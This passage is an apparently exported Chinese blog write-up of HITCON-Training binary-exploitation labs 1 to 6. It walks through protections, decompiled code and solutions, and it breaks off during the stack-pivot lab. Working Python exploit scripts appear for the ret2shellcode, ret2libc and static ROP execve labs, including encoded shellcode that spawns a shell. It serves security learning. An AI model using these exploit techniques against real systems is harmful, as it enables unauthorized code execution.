{"name":"pwn","slug":"pwn","count":3,"postlist":[{"title":"HITCON_training题解(一)","slug":"HITCON-training-1","date":"2019-04-10T06:47:42.000Z","updated":"2019-04-10T06:58:02.000Z","comments":true,"path":"api/articles/HITCON-training-1.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"Lab1——sysmagic\"><a href=\"#Lab1——sysmagic\" class=\"headerlink\" title=\"Lab1——sysmagic\"></a>Lab1——sysmagic</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序要求输入一个magic，然后就直接退出。用IDA看一下：</p>\n<p>在函数get_flag中直接要求读入到栈上v2处（ebp+0x7c），如果v2和随机数buf相等，则直接打印出栈上的flag。buf在(ebp+0x80处)。不过貌似没有较好的溢出方法，不过这实际上是一道逆向题，通过逆向可以直接找到答案。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> read(fd, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me maigc :\"</span>);</span><br><span class=\"line\"> __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( buf == v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x30</span>; ++i )</span><br><span class=\"line\">     <span class=\"built_in\">putchar</span>((<span class=\"keyword\">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>观察汇编代码，还原两个字符串，然后按位异或即可找到flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = &apos;\\x44\\x6f\\x5f\\x79\\x6f\\x75\\x5f\\x6b&apos;</span><br><span class=\"line\">str1 += &apos;\\x6e\\x6f\\x77\\x5f\\x77\\x68\\x79\\x5f&apos;</span><br><span class=\"line\">str1 += &apos;\\x6d\\x79\\x5f\\x74\\x65\\x61\\x6d\\x6d&apos;</span><br><span class=\"line\">str1 += &apos;\\x61\\x74\\x65\\x5f\\x4f\\x72\\x61\\x6e&apos;</span><br><span class=\"line\">str1 += &apos;\\x67\\x65\\x5f\\x69\\x73\\x5f\\x73\\x6f&apos;</span><br><span class=\"line\">str1 += &apos;\\x5f\\x61\\x6e\\x67\\x72\\x79\\x3f\\x3f\\x3f&apos;</span><br><span class=\"line\">str2 = &apos;\\x07\\x3b\\x19\\x02\\x0b\\x10\\x3d\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x08\\x12\\x2d\\x28\\x59\\x0a\\x00\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x16\\x00\\x04\\x55\\x16\\x08\\x1f\\x07\\x01&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x00\\x7e\\x1c\\x3e\\x0a\\x1e\\x0b\\x6b&apos;</span><br><span class=\"line\">str2 += &apos;\\x04\\x42\\x3c\\x2c\\x5b\\x31\\x55\\x02\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x21\\x10\\x4c\\x1e\\x42&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(str1)):</span><br><span class=\"line\">\tflag += chr(ord(str1[i]) ^ ord(str2[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">print flag</span><br><span class=\"line\"></span><br><span class=\"line\">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span><br><span class=\"line\">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab2——orw\"><a href=\"#Lab2——orw\" class=\"headerlink\" title=\"Lab2——orw\"></a>Lab2——orw</h2><p>是手写汇编的练习，略。</p>\n<h2 id=\"Lab3——ret2shellcode\"><a href=\"#Lab3——ret2shellcode\" class=\"headerlink\" title=\"Lab3——ret2shellcode\"></a>Lab3——ret2shellcode</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>未开启任何防护</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab3$ checksec ret2sc</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>顾名思义，该题是用ret2sc的方法。main函数中首先从stdin读入，往bss段上写了0x32字节，然后栈溢出返回到刚刚写的地址即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-14h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name:\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;name, <span class=\"number\">0x32</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Try your best:\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)gets(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># ref: https://www.exploit-db.com/shellcodes/41630</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\xeb\\x10\\x5e\\x31\\xc9\\xb1\\x15\\x8a\\x06\\x34\\xe9\\x88\\x06\\x46\\xe2\\xf7\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xd8\\x20\\xb8\\x81\\xc6\\xc6\\x9a\\x81\\x81\\xc6\\x8b\\x80\\x87\\x60\\x0a\\x83\\xe2\\xb1\\x70\\x24\\x69\"</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x804a060</span></span><br><span class=\"line\">offset = <span class=\"number\">0x1c</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name:\"</span>, shellcode)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Try your best:\"</span>, offset *<span class=\"string\">\"a\"</span> + p32(bss_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab4——ret2lib\"><a href=\"#Lab4——ret2lib\" class=\"headerlink\" title=\"Lab4——ret2lib\"></a>Lab4——ret2lib</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开启了NX，无法使用ret2sc。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab4$ checksec ret2lib</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序首先会主动leak出任意地址，可以通过这一点leak got表获取libc的加载基址，然后构造rop链即可。</p>\n<p>注意在Print_message中dest离eip的偏移为0x38 + 4</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> **v3; <span class=\"comment\">// ST04_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> src; <span class=\"comment\">// [esp+12h] [ebp-10Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+112h] [ebp-Eh]</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// [esp+11Ch] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Do you know return to library ?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What do you want to see in memory?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me an address (in dec) :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0xA</span>u);</span><br><span class=\"line\">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class=\"line\">  See_something(v8);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Leave some message for me :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;src, <span class=\"number\">0x100</span>u);</span><br><span class=\"line\">  Print_message(&amp;src);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Thanks you ~\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.send(str(elf.got[<span class=\"string\">'__libc_start_main'</span>]))</span><br><span class=\"line\">addr = int(p.recvline().split(<span class=\"string\">\": \"</span>)[<span class=\"number\">-1</span>].strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">write = libc.symbols[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048570</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x38</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"for me :\"</span>, rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab5——simplerop\"><a href=\"#Lab5——simplerop\" class=\"headerlink\" title=\"Lab5——simplerop\"></a>Lab5——simplerop</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab5$ checksec simplerop</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>直接栈溢出。不过该题是静态链接的，没有加载libc.so，并且题目中没有system，所以需要手动构造ROP链，利用系统调用sys_execve执行利用。</p>\n<p>首先要把参数写到相应的寄存器，然后执行int 0x80</p>\n<ul>\n<li>系统调用号存入EAX（execve的为11）</li>\n<li>通过ebx,ecx,edx,esi,edi等传递参数</li>\n<li>最后调用int 0x80</li>\n</ul>\n<p>这里要用到ROPgadget工具，来搜索可用的gadget。主要就是一些pop|ret和int 0x80的gadget。</p>\n<p>另外，题目中没有现成的/bin/sh字符串，需要首先写入。我采用的是调用静态链接进来的read函数，写入到bss段。官方writeup中采用了一种更为巧妙的方法，使用如下的gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dword ptr [edx], eax ;</span><br><span class=\"line\">ret ;</span><br></pre></td></tr></table></figure>\n<p>通过<code>pop eax;ret pop edx; ret</code>将字符串四位四位的写到data段（或bss段）。可以看到这种方法的通用性更强。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#write to memory</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span>*<span class=\"number\">32</span></span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/sh\\x00\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br></pre></td></tr></table></figure>\n<p>我的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">int80 = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">popecx_popebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">popeax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">popedx = <span class=\"number\">0x0806e82a</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x80ec2c0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048e24</span></span><br><span class=\"line\">read = <span class=\"number\">0x806cd50</span></span><br><span class=\"line\">offset = <span class=\"number\">0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(read)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(bss_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = (offset - <span class=\"number\">8</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(popeax)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xb</span>)</span><br><span class=\"line\">rop += p32(popecx_popebx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) + p32(bss_addr)</span><br><span class=\"line\">rop += p32(popedx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(int80)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab6——migration\"><a href=\"#Lab6——migration\" class=\"headerlink\" title=\"Lab6——migration\"></a>Lab6——migration</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab6$ checksec migration</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题溢出的字节较少，而又需要leak libc，构造利用链，所以显然栈空间是不够的；但是又不能先布置shellcode，再<code>jmp esp</code>跳到shellcode执行，所以需要考虑其他方法。根据题目名字的提示，应该是用栈迁移的方法。</p>\n<p>用ROPgadget搜索，注意到以下gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x08048418 : leave ; ret</span><br></pre></td></tr></table></figure>\n<p>我们通过溢出将栈布局为如下格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buffer padding | fake ebp | leave ret addr|</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数的返回地址被覆盖为leave_ret的地址，这样在函数执行完自己的leave_ret后还会在执行一次leave_ret。当函数执行完自己的leave时，ebp为fake ebp的值，即指向ebp2；当函数再执行自己的ret的时候，会执行leave_ret，先令esp也指向ebp2，然后将fake ebp处的第一个4bytes pop给ebp，即将ebp的值修改为ebp2，然后执行ret，将fake ebp后的第二个4bytes所存的地址给eip，即将eip的值修改为target function addr。</li>\n<li>如果调用的是函数，则函数入口点首先会调用push ebp，就会将ebp2的值压栈；然后调用mov ebp，esp，ebp指向当前基地址。</li>\n<li>由上可知，我们fake ebp处假的栈桢结构如下：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake ebp</span><br><span class=\"line\"></span><br><span class=\"line\">ebp2 | target function addr | leave ret addr | arg1 | arg2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>当程序在执行完target function之后，会再执行两次leave_ret，如果我们在ebp2处也布置好了对应的内容，就可以一直控制程序的执行流程</li>\n</ul>\n<p>我们需要一块可以写的内存，并且我们还知道这块内存的地址。所以通过gdb调试可以看出，由于未开启PIE，elf文件所加载的地址我们是知道的，而这其中可读可写的段有0x804a000~0x804b000，在这0x1000个bytes中找一块内存区域即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 